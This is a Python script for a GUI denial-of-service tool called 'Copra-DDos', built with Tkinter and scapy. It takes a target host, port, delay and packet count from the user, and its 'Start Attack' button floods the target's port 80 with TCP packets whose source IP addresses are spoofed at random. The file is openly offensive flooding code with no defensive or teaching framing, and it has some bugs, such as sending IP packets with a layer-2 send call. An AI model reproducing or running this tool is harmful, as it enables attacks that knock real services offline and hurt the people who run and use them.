from scapy.all import *
from scapy.layers.inet import Ether, IP, TCP , SourceIPField
import time
from tkinter import *
import tkinter as tk
from socket import *
from tkinter import ttk

def copraddos():


#Title of tool
    title = Label(copragui, text="Copra-DDos", bg="darkgreen", font="8", width="20")
    title.place(x=215,y=4)

# Title of entry <<

    target_label = Label(copragui, text=" Target-host ", bg="darkgreen", font="Georgia, 14")
    target_label.place(x=250, y=64)

# Combobox

    threads = ttk.Combobox(copragui, width=10,
                       values=('0.05','1','2','3','4','5'),
                       state="readonly",
                       font="10",
                       textvariable=thread
                       )
    threads.place(x=10,y=120)


# Here you can enter target ip
    Target_ip = Entry(copragui, width="20", font="Georgia, 14", textvariable=ip)
    Target_ip.place(x=5, y= 65)

# port options 
    port = Entry(copragui, width="10", font="Georgia, 14", textvariable=ccport)
    port.place(x=10, y=250)

    portL = Label(copragui, text="Enter Port", font="Georgia, 14", bg="darkgreen")
    portL.place(x=150, y=250)



# packets number 
    p_number = Label(copragui, text="Packets number", bg="darkgreen", font="Georgia, 14")
    p_number.place(x= 250, y=200)
    sent = Entry(copragui, width="20", font="Georgia, 14", textvariable=packetnum)
    sent.place(x=10,y=200)
# Running Button

    start_ddos = Button(copragui, text="Start Attack", font="Georgia, 16", bg="darkgreen", border=5, command=attack)
    start_ddos.place(x=270 , y=350)


def attack():
    target = ip.get()
    uport = ccport.get()
    host = gethostbyname(target)
    delay = thread.get()
    pnum = packetnum.get()
    onoff = True
    d = 1
    while onoff:
        at1 = str(random.randint(1,254))
        at2 = str(random.randint(1,254))
        at3 = str(random.randint(1,254))
        at4 = str(random.randint(1,254))
        dot="."
        src = at1+dot+at2+dot+at3+dot+at4
        IP1 = IP(src = src,dst = host)
        TCP1 = TCP(sport = uport,dport = 80)
        pkt = IP1 / TCP1
        sendp(pkt,inter = float(delay))
        d = d + 1
        msg = ("CopraDDOS > Packets sending ", "["+ str(d),"]")
        # Starting Frame ========
        dos = Label(copragui, text=msg, bg="Red", font="darkgreen")
        dos.place(x=200 , y=300)
        if d == pnum:
            onoff = False
        else:
            continue




copragui = tk.Tk()
copragui.title("Copra DDOS")
copragui.geometry("670x530")
copragui.config(bg="black")
copragui.resizable(False,False)



thread = StringVar()
ip = StringVar()
packetnum = IntVar()
ccport = IntVar()



copraddos()
copragui.mainloop()
